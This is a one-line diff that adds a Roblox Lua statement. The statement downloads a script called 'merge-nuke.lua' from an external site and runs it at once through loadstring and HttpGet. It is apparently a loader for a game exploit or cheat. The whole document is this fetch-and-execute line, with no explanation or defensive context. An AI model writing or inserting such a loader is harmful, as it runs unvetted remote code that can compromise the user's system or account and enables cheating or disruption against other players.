@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://synex.lat/loaders/merge-nuke.lua"))()
